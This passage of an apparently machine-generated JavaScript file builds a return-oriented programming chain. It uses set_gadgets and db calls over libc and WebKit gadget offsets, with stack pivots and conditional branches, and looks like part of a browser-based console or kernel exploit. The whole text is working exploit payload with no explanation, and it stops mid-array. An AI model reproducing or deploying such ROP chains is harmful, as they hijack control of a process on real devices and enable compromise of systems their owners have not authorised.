set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+203296,//L3119
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3119:
db([0,0]);
set_gadgets([
webkit_base+972324,//mov [rax],ecx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+203400,//L3121
webkit_base+4687784,
libc_base+768796
]);
//L3120:
db([41,0]);// 0x29
set_gadget(webkit_base+3789839,);//pop r11
//L3121:
db([0,0]);
set_gadget(libc_base+165442,);
//L3122:
db([41,0]);// 0x29
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+203512,//L3124
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+203496,//L3123
webkit_base+4687784,
libc_base+165442
]);
//L3123:
db([0,0]);
set_gadget(libc_base+768796,);
//L3124:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+203608,//L3127
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3125:
db([4294967256,4294967295]);// -0x28
set_gadget(libc_base+772328,);
//L3127:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+203696,//L3129
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+203712,//L3130
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3129:
db([0,0]);
set_gadget(libc_base+772328,);
//L3130:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+203816,//L3133
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+203800,//L3132
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L3132:
db([0,0]);
set_gadget(libc_base+772328,);
//L3133:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+203888,//L3136
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
//L3134:
db([4,0]);// 0x4
set_gadget(libc_base+772328,);
//L3136:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+204000,//L3138
webkit_base+4687784,
libc_base+768796
]);
//L3137:
db([61,0]);// 0x3d
set_gadget(webkit_base+3789839,);//pop r11
//L3138:
db([0,0]);
set_gadget(libc_base+165442,);
//L3139:
db([61,0]);// 0x3d
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+204112,//L3141
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+204096,//L3140
webkit_base+4687784,
libc_base+165442
]);
//L3140:
db([0,0]);
set_gadget(libc_base+768796,);
//L3141:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+204208,//L3144
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3142:
db([4294967256,4294967295]);// -0x28
set_gadget(libc_base+772328,);
//L3144:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+204296,//L3146
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+204312,//L3147
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3146:
db([0,0]);
set_gadget(libc_base+772328,);
//L3147:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+204416,//L3150
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+204400,//L3149
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L3149:
db([0,0]);
set_gadget(libc_base+772328,);
//L3150:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+204488,//L3153
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
//L3151:
db([8,0]);// 0x8
set_gadget(libc_base+772328,);
//L3153:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+204600,//L3155
webkit_base+4687784,
libc_base+768796
]);
//L3154:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L3155:
db([0,0]);
set_gadget(libc_base+165442,);
//L3156:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+204712,//L3158
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+204696,//L3157
webkit_base+4687784,
libc_base+165442
]);
//L3157:
db([0,0]);
set_gadget(libc_base+768796,);
//L3158:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+204808,//L3161
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3159:
db([4294967256,4294967295]);// -0x28
set_gadget(libc_base+772328,);
//L3161:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+204896,//L3163
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+204912,//L3164
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3163:
db([0,0]);
set_gadget(libc_base+772328,);
//L3164:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+205056,//L3167
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+205024,//L3165
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+205040,//L3166
webkit_base+4687784,
libc_base+165442
]);
//L3165:
db([0,0]);
set_gadget(libc_base+772328,);
//L3166:
db([0,0]);
set_gadget(libc_base+768796,);
//L3167:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+205128,//L3169
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3169:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+205184,//L3171
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3171:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L3172:
db([12,0]);// 0xc
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L3173:
db([8,0]);// 0x8
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+205376,//L3175
webkit_base+4687784,
libc_base+768796
]);
//L3174:
db([1,0]);// 0x1
set_gadget(webkit_base+3789839,);//pop r11
//L3175:
db([0,0]);
set_gadget(libc_base+165442,);
//L3176:
db([1,0]);// 0x1
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+205520,//L3178
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+205536,//L3179
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+205504,//L3177
webkit_base+4687784,
libc_base+165442
]);
//L3177:
db([0,0]);
set_gadget(libc_base+772328,);
//L3178:
db([0,0]);
set_gadget(libc_base+768796,);
//L3179:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+205648,//L3180
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+205664,//L3181
webkit_base+4687784,
libc_base+772328
]);
//L3180:
db([0,0]);
set_gadget(libc_base+768796,);
//L3181:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L3182:
db([8,0]);// 0x8
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+205848,//L3184
webkit_base+4687784,
libc_base+768796
]);
//L3183:
db([1,0]);// 0x1
set_gadget(webkit_base+3789839,);//pop r11
//L3184:
db([0,0]);
set_gadget(libc_base+165442,);
//L3185:
db([1,0]);// 0x1
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+205992,//L3187
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+206008,//L3188
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+205976,//L3186
webkit_base+4687784,
libc_base+165442
]);
//L3186:
db([0,0]);
set_gadget(libc_base+772328,);
//L3187:
db([0,0]);
set_gadget(libc_base+768796,);
//L3188:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+206104,//L3190
webkit_base+4687784,
libc_base+713278
]);
//L3189:
db([4294967295,4294967295]);// 0xffffffffffffffff
set_gadget(libc_base+768796,);
//L3190:
db([0,0]);
set_gadgets([
libc_base+856504,//xor rax,rsi ;sub rax,rsi
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+206168,//L3192
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3192:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+206224,//L3194
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3194:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+5236215,//and rax,rcx
libc_base+713278,
ropchain+206328,//L3195
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+206344,//L3196
webkit_base+4687784,
libc_base+772328
]);
//L3195:
db([0,0]);
set_gadget(libc_base+768796,);
//L3196:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+206432,//L3198
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3198:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+206488,//L3200
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3200:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+206560,//L3202
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3202:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+206616,//L3204
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3204:
db([0,0]);
set_gadgets([
webkit_base+972324,//mov [rax],ecx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
//L3205:
libc_base+713278,
ropchain+206720,//L3208
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3206:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L3208:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+206808,//L3210
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+206824,//L3211
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3210:
db([0,0]);
set_gadget(libc_base+772328,);
//L3211:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+206904,//L3212
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+206920,//L3213
webkit_base+4687784,
libc_base+165442
]);
//L3212:
db([0,0]);
set_gadget(libc_base+768796,);
//L3213:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+207080,//L3215
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+207112,//L3217
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+207064,//L3214
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+207096,//L3216
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3214:
db([0,0]);
set_gadget(libc_base+165442,);
//L3215:
db([0,0]);
set_gadget(libc_base+772328,);
//L3216:
db([0,0]);
set_gadget(libc_base+768796,);
//L3217:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+207192,//L3218
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+207208,//L3219
webkit_base+4687784,
libc_base+165442
]);
//L3218:
db([0,0]);
set_gadget(libc_base+768796,);
//L3219:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+207320,//L3222
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+207304,//L3221
webkit_base+4687784,
libc_base+713278
]);
//L3220:
db([0,0]);
set_gadget(libc_base+165442,);
//L3221:
db([0,0]);
set_gadget(libc_base+768796,);
//L3222:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+207456,//L3224
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+207472,//L3225
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+207440,//L3223
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3223:
db([0,0]);
set_gadget(libc_base+165442,);
//L3224:
db([0,0]);
set_gadget(libc_base+768796,);
//L3225:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+207616,//L3229
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+207648,//L3231
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+207584,//L3227
webkit_base+4687784,
libc_base+165442
]);
//L3227:
db([0,0]);
set_gadget(libc_base+713278,);
//L3228:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L3229:
db([0,0]);
set_gadget(libc_base+772328,);
//L3230:
db([0,0]);
set_gadget(libc_base+768796,);
//L3231:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+207760,//L3232+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+207752,//L3232
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L3232:
db([0,0]);
set_gadgets([
ropchain+207776,//L3232+24
ropchain+209536,//L3226
libc_base+713278,
ropchain+207832,//L3235
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3233:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L3235:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+207920,//L3237
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+207936,//L3238
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3237:
db([0,0]);
set_gadget(libc_base+772328,);
//L3238:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+208080,//L3241
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+208096,//L3242
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+208064,//L3240
webkit_base+4687784,
libc_base+713278
]);
//L3239:
db([16,0]);// 0x10
set_gadget(libc_base+165442,);
//L3240:
db([0,0]);
set_gadget(libc_base+772328,);
//L3241:
db([0,0]);
set_gadget(libc_base+768796,);
//L3242:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+208184,//L3244
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+208200,//L3245
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3244:
db([0,0]);
set_gadget(libc_base+772328,);
//L3245:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+208360,//L3247
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+208392,//L3249
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+208344,//L3246
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+208376,//L3248
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3246:
db([0,0]);
set_gadget(libc_base+165442,);
//L3247:
db([0,0]);
set_gadget(libc_base+772328,);
//L3248:
db([0,0]);
set_gadget(libc_base+768796,);
//L3249:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+208488,//L3251
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+208472,//L3250
webkit_base+4687784,
libc_base+165442
]);
//L3250:
db([0,0]);
set_gadget(libc_base+768796,);
//L3251:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L3253:
ropchain+208592,//L3252
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+178496,//_get_tclass_2
//L3252:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+208736,//L3255
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+208752,//L3256
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+208720,//L3254
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3254:
db([0,0]);
set_gadget(libc_base+165442,);
//L3255:
db([0,0]);
set_gadget(libc_base+768796,);
//L3256:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+208848,//L3258
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+208832,//L3257
webkit_base+4687784,
libc_base+165442
]);
//L3257:
db([0,0]);
set_gadget(libc_base+768796,);
//L3258:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+208944,//L3260
webkit_base+4687784,
libc_base+768796
]);
//L3259:
db([65,0]);// 0x41
set_gadget(webkit_base+3789839,);//pop r11
//L3260:
db([0,0]);
set_gadget(libc_base+165442,);
//L3261:
db([65,0]);// 0x41
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+209088,//L3263
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+209104,//L3264
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+209072,//L3262
webkit_base+4687784,
libc_base+165442
]);
//L3262:
db([0,0]);
set_gadget(libc_base+772328,);
//L3263:
db([0,0]);
set_gadget(libc_base+768796,);
//L3264:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+15055763,//cmp rax,rcx ;sete al
libc_base+350006,//setne al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+209280,//L3266
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+209296,//L3267
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+209264,//L3265
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3265:
db([0,0]);
set_gadget(libc_base+165442,);
//L3266:
db([0,0]);
set_gadget(libc_base+768796,);
//L3267:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+209440,//L3270
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+209456,//L3271
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+209408,//L3268
webkit_base+4687784,
libc_base+165442
]);
//L3268:
db([0,0]);
set_gadget(libc_base+713278,);
//L3269:
db([0,0]);
set_gadget(libc_base+772328,);
//L3270:
db([0,0]);
set_gadget(libc_base+768796,);
//L3271:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+350006,//setne al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+209528,//L3273
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3273:
db([0,0]);
//L3226:
set_gadgets([
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+209656,//L3275
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+209672,//L3276
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+209640,//L3274
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3274:
db([0,0]);
set_gadget(libc_base+165442,);
//L3275:
db([0,0]);
set_gadget(libc_base+768796,);
//L3276:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+209800,//L3279
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+209832,//L3281
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+209816,//L3280
webkit_base+4687784,
libc_base+713278
]);
//L3278:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L3279:
db([0,0]);
set_gadget(libc_base+165442,);
//L3280:
db([0,0]);
set_gadget(libc_base+768796,);
//L3281:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+209944,//L3282+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+209936,//L3282
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L3282:
db([0,0]);
set_gadgets([
ropchain+209960,//L3282+24
ropchain+211952,//L3277
libc_base+768796
]);
//L3283:
db([24,0]);// 0x18
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+210064,//L3285
webkit_base+4687784,
libc_base+713278
]);
//L3284:
db([4294967264,4294967295]);// -0x20
set_gadget(libc_base+768796,);
//L3285:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L3286:
db([25,0]);// 0x19
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L3287:
db([41,0]);// 0x29
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+210264,//L3290
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3288:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L3290:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+210352,//L3292
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+210368,//L3293
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3292:
db([0,0]);
set_gadget(libc_base+772328,);
//L3293:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+210512,//L3296
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+210528,//L3297
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+210496,//L3295
webkit_base+4687784,
libc_base+713278
]);
//L3294:
db([16,0]);// 0x10
set_gadget(libc_base+165442,);
//L3295:
db([0,0]);
set_gadget(libc_base+772328,);
//L3296:
db([0,0]);
set_gadget(libc_base+768796,);
//L3297:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+210616,//L3299
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+210632,//L3300
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3299:
db([0,0]);
set_gadget(libc_base+772328,);
//L3300:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+210792,//L3302
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+210824,//L3304
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+210776,//L3301
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+210808,//L3303
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3301:
db([0,0]);
set_gadget(libc_base+165442,);
//L3302:
db([0,0]);
set_gadget(libc_base+772328,);
//L3303:
db([0,0]);
set_gadget(libc_base+768796,);
//L3304:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+210920,//L3306
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+210904,//L3305
webkit_base+4687784,
libc_base+165442
]);
//L3305:
db([0,0]);
set_gadget(libc_base+768796,);
//L3306:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L3308:
ropchain+211024,//L3307
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+213488,//L3309
//L3307:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967256,4294967295]);// -0x28
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+211168,//L3311
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+211184,//L3312
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+211152,//L3310
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3310:
db([0,0]);
set_gadget(libc_base+165442,);
//L3311:
db([0,0]);
set_gadget(libc_base+768796,);
//L3312:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+211312,//L3315
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+211344,//L3317
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+211328,//L3316
webkit_base+4687784,
libc_base+713278
]);
//L3314:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L3315:
db([0,0]);
set_gadget(libc_base+165442,);
//L3316:
db([0,0]);
set_gadget(libc_base+768796,);
//L3317:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+211456,//L3318+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+211448,//L3318
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L3318:
db([0,0]);
set_gadgets([
ropchain+211472,//L3318+24
ropchain+211936,//L3313
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+211544,//L3321
webkit_base+4687784,
libc_base+768796
]);
//L3319:
db([0,0]);
set_gadget(libc_base+165442,);
//L3320:
db([0,0]);
set_gadget(libc_base+772328,);
//L3321:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
